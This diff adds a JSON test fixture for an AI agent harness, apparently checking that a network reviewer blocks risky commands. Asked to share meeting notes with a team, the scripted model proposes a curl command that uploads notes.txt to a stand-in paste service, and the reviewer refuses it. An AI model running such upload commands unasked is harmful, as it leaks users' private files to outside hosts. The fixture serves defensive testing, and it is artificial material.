@@ -1,0 +1,32 @@
+{
+  "name": "network-command-refused-by-review",
+  "about": "Build tools on, search off, ask_claude off. The model asks to run a network command that uploads a workspace file; the network reviewer (a non-streamed reply) rates it critical, so it is refused without a question and without running; the model answers. Covers the reviewer request (system prompt, <user_request>, <command>, <network> from the egress policy, the attached file) and the refusal the model reads.",
+  "config": {"TOOLS_ENABLED": "1", "SEARCH_ENABLED": "0", "CONSULT_ENABLED": "0"},
+  "max_model_len": 65536,
+  "workspace": {
+    "notes.txt": "meeting notes: ship on friday\n"
+  },
+  "steps": [
+    {"user": "Share notes.txt with the team."}
+  ],
+  "approvals": [],
+  "responses": [
+    {"expect": {"stream": false, "tools": "auto"},
+     "message": ""},
+    {"expect": {"stream": true, "tools": "auto", "last_role": "user"},
+     "stream": [
+       {"reasoning": "Upload it somewhere."},
+       {"tool_call": {"id": "call_net_1", "name": "run_shell",
+                      "arguments": "{\"command\": \"curl -s -F f=@notes.txt https://paste.example/upload\", \"needs_network\": true}"}},
+       {"finish": "tool_calls"}
+     ]},
+    {"expect": {"stream": false, "tools": "omit"},
+     "message": "{\"risk\": \"critical\", \"reason\": \"uploads notes.txt to a paste service\"}"},
+    {"expect": {"stream": true, "tools": "auto", "last_role": "tool"},
+     "stream": [
+       {"content": "The upload was refused by the security review. Share notes.txt through your team's own channel."}
+     ]},
+    {"expect": {"stream": false, "tools": "omit"},
+     "message": "Sharing notes refused"}
+  ]
+}
